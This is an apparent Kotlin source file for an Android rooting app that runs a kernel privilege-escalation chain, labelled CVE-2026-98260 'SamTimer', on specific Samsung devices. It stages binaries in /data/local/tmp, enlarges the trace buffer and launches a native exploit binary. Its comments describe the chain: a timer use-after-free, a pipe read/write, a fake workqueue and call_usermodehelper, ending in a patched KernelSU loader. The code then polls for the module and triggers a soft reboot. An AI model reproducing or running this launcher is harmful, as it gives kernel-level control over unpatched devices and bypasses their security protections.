package com.roottimer.app

import android.content.Context
import android.os.Build
import android.os.Process
import java.io.File
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean
import java.util.concurrent.atomic.AtomicInteger

/**
 * Shizuku UserService: runs the CVE-2026-98260 SamTimer chain as the shell user.
 *
 * This is the stable UMH flow:
 *  1. stage uhexec / action / KDP-patched ksud 3.2.5 into /data/local/tmp
 *  2. raise tracefs headroom
 *  3. run libtimer.so umhpipe: timer UAF -> pipe read/write -> fake workqueue
 *     -> call_usermodehelper -> uhexec -> ksud late-load
 *  4. leave the exploit parked (it must not be killed while it holds its page)
 */
class RootService(private val context: Context) : IRootService.Stub() {

    private val running = AtomicBoolean(false)
    private val lastExit = AtomicInteger(1)
    @Volatile private var lspdMode = false
    @Volatile private var autoSoftReboot = true

    companion object {
        private const val WORK_DIR = "/data/local/tmp/w"
        private const val KSUD_STAGE_PATH = "/data/local/tmp/.ksud-stage"
        private const val TRACE_BUF = "/sys/kernel/tracing/buffer_size_kb"
        private const val WAIT_SEC = 300L

        // e1q/e2q/e3q DZJ3 builds share one kernel image; identify by build id.
        private const val KERNEL_BUILD = "6.1.145-android14-11-3254743"
        private val SUPPORTED_DEVICES = setOf("e3q", "e1q", "e2q")

        private const val ASSET_UHEXEC = "uhexec"
        private const val ASSET_ACTION = "umh_action.sh"
        private const val ASSET_KSUD = "ksud-s25u-kdp"
    }

    override fun setMode(lspd: Boolean) {
        lspdMode = lspd
    }

    override fun setSoftReboot(enabled: Boolean) {
        autoSoftReboot = enabled
    }

    override fun softRebootNow() {
        Thread({ softReboot(null) }, "soft-reboot-now").start()
    }

    override fun fixKernelFeatures(callback: IRootCallback?) {
        if (callback == null) return
        Thread({
            var rc = 1
            try {
                log(callback, "重新应用 KernelSU 特性配置（ksud feature load）…")
                val p = ProcessBuilder("su", "-c", "/data/adb/ksud feature load")
                    .redirectErrorStream(true)
                    .start()
                p.inputStream.bufferedReader().useLines { lines ->
                    for (line in lines) log(callback, line)
                }
                rc = p.waitFor()
                log(callback, "ksud feature load 结束，rc=$rc")
            } catch (e: Exception) {
                log(callback, "error: ${e.message}")
            } finally {
                runCatching { callback.onComplete(rc, moduleLive()) }
            }
        }, "fix-kernel-features").start()
    }

    override fun isReady(): Boolean {
        val uid = Process.myUid()
        return uid == 2000 || uid == 0
    }

    override fun isRooted(): Boolean = moduleLive()

    override fun destroy() {}

    private fun moduleLive(): Boolean = try {
        File("/proc/modules").useLines { lines ->
            lines.any { it.startsWith("kernelsu ") }
        }
    } catch (_: Exception) {
        false
    }

    override fun runExploit(callback: IRootCallback?) {
        if (callback == null) return
        if (!running.compareAndSet(false, true)) {
            callback.onLog("error: another run is already in progress")
            callback.onComplete(1, false)
            return
        }
        Thread({
            var ok = false
            var rc = 1
            try {
                rc = runChain(callback)
                ok = rc == 0
            } catch (e: Exception) {
                runCatching { callback.onLog("error: ${e.message}") }
            } finally {
                lastExit.set(rc)
                runCatching { callback.onComplete(rc, ok) }
                running.set(false)
            }
        }, "samtimer-runner").start()
    }

    private fun log(callback: IRootCallback?, line: String) {
        if (callback != null) runCatching { callback.onLog(line) }
    }

    private fun stageAsset(name: String, dest: File): Boolean {
        return try {
            dest.parentFile?.mkdirs()
            if (dest.exists() && !dest.delete()) {
                // root-owned leftovers from an earlier boot are common; retry
                // after the app has root once, otherwise report it.
            }
            context.assets.open(name).use { input ->
                dest.outputStream().use { output -> input.copyTo(output) }
            }
            dest.setReadable(true, false)
            dest.setExecutable(true, false)
            true
        } catch (e: Exception) {
            false
        }
    }

    private fun softReboot(callback: IRootCallback?) {
        log(callback, "执行 KernelSU 软重启（激活 LSPosed/模块）…")
        val logFile = File("/data/local/tmp/samtimer/softreboot.log")
        fun dbg(line: String) {
            runCatching {
                logFile.parentFile?.mkdirs()
                logFile.appendText("[" + System.currentTimeMillis() + "] " + line + "\n")
            }
        }
        dbg("softReboot requested")
        // UserService runs as shell uid and /data/adb is 0700 root:root, so
        // File("/data/adb/ksud").exists() is false even when ksud is present.
        // Do not pre-check; let `su -c` execute it, then fall back to direct.
        val su = listOf("/system/bin/su", "/system/xbin/su", "su")
            .firstOrNull { it == "su" || File(it).exists() } ?: "su"
        dbg("su=" + su)
        val attempts = listOf(
            listOf(su, "-c", "/data/adb/ksud soft-reboot"),
            listOf(su, "-c", "/data/adb/ksu/bin/ksud soft-reboot"),
            listOf("/data/adb/ksud", "soft-reboot"),
        )
        for (cmd in attempts) {
            dbg("attempt: " + cmd.joinToString(" "))
            try {
                val pb = ProcessBuilder(cmd)
                pb.redirectErrorStream(true)
                pb.redirectOutput(ProcessBuilder.Redirect.appendTo(logFile))
                val p = pb.start()
                dbg("started: " + cmd.joinToString(" "))
                log(callback, "soft-reboot 已启动: ${cmd.joinToString(" ")}")
                val done = p.waitFor(6, TimeUnit.SECONDS)
                if (!done) {
                    log(callback, "soft-reboot 进行中（框架即将重启）")
                    return
                }
                if (p.exitValue() == 0) {
                    log(callback, "soft-reboot 命令返回 0")
                    return
                }
                dbg("exit=" + p.exitValue())
                log(callback, "warn: soft-reboot 返回 ${p.exitValue()}，尝试下一种方式…")
            } catch (e: Exception) {
                dbg("start failed: " + (e.message ?: "?"))
                log(callback, "warn: soft-reboot 启动失败: ${e.message}")
            }
        }
        dbg("all attempts failed")
        log(callback, "warn: 自动软重启失败；请在 KernelSU 管理器里手动软重启")
    }

    private fun detectTarget(): String? =
        if (System.getProperty("os.version").orEmpty().contains(KERNEL_BUILD)) "DZJ3"
        else null

    private fun runChain(callback: IRootCallback): Int {
        val uid = Process.myUid()
        if (uid != 2000 && uid != 0) {
            log(callback, "error: not running as shell/root (uid=$uid)")
            return 1
        }
        log(callback, "shell context ok (uid=$uid)")

        val target = detectTarget()
        if (!SUPPORTED_DEVICES.contains(Build.DEVICE) || target == null) {
            log(callback, "不支持的机型/固件：model=${Build.MODEL} device=${Build.DEVICE} " +
                "incremental=${Build.VERSION.INCREMENTAL}")
            log(callback, "仅支持 e1q/e2q/e3q（内核 ${KERNEL_BUILD}）")
            return 1
        }
        log(callback, "target=$target model=${Build.MODEL} device=${Build.DEVICE}")
        log(callback, "incremental=${Build.VERSION.INCREMENTAL}")
        log(callback, "kernel=${System.getProperty("os.version")}")

        if (moduleLive()) {
            log(callback, "KernelSU module already live")
            return 0
        }

        val nativeDir = File(context.applicationInfo.nativeLibraryDir)
        val lspd = lspdMode
        val timerName = if (lspd) "libtimer_lspd.so" else "libtimer_std.so"
        val timerBin = File(nativeDir, timerName)
        log(callback, "mode=" + (if (lspd) "LSPosed/module-stage" else "standard") + " bin=" + timerName)
        if (!timerBin.isFile) {
            log(callback, "error: exploit binary missing: ${timerBin.absolutePath}")
            return 1
        }

        val workDir = File(WORK_DIR)
        if (!(workDir.isDirectory || workDir.mkdirs())) {
            log(callback, "error: cannot create $WORK_DIR")
            return 1
        }
        val uhexec = File(workDir, "uhexec")
        val action = File(workDir, "umh_action.sh")
        val ksud = File("/data/local/tmp/ksud-s25u-kdp")
        val stage = File(KSUD_STAGE_PATH)

        if (!stageAsset(ASSET_UHEXEC, uhexec) ||
            !stageAsset(ASSET_ACTION, action) ||
            !stageAsset(ASSET_KSUD, ksud) ||
            !stageAsset(ASSET_KSUD, stage)
        ) {
            log(callback, "error: failed to stage embedded files")
            return 1
        }
        log(callback, "staged uhexec=${uhexec.length()} action=${action.length()} ksud=${ksud.length()}")
        log(callback, "staged $KSUD_STAGE_PATH")

        try {
            File(TRACE_BUF).writeText("65536\n")
            log(callback, "trace buffer set to 65536kB")
        } catch (e: Exception) {
            log(callback, "warn: trace buffer write failed (${e.message})")
        }

        log(callback, "starting exploit (umhpipe)...")
        val proc = ProcessBuilder(timerBin.absolutePath, "umhpipe")
            .directory(workDir)
            .redirectErrorStream(true)
            .start()

        val tail = Thread({
            try {
                proc.inputStream.bufferedReader().useLines { lines ->
                    for (line in lines) log(callback, line)
                }
            } catch (_: Exception) {
            }
        }, "samtimer-tail")
        tail.isDaemon = true
        tail.start()

        val deadline = System.currentTimeMillis() + WAIT_SEC * 1000
        while (System.currentTimeMillis() < deadline) {
            if (moduleLive()) {
                log(callback, "KERNELSU_LIVE")
                log(callback, "success; exploit left parked (do not force-stop)")
                if (lspd && autoSoftReboot) {
                    // LSPosed/Zygisk modules only attach to a fresh zygote.
                    // KernelSU's ksud soft-reboot restarts the framework
                    // without a real reboot, so the kernel module (and root)
                    // survives while LSPosed becomes active.
                    Thread({
                        try { Thread.sleep(2000) } catch (_: Exception) {}
                        softReboot(callback)
                    }, "soft-reboot-after-root").start()
                }
                return 0
            }
            try {
                Thread.sleep(1000)
            } catch (_: InterruptedException) {
                break
            }
        }

        // Do not kill the exploit: it may hold the fake work page and its
        // zombie chain. A reboot clears it; a kill can panic the kernel.
        log(callback, "error: KernelSU did not appear within ${WAIT_SEC}s (exploit left parked)")
        return 4
    }
}
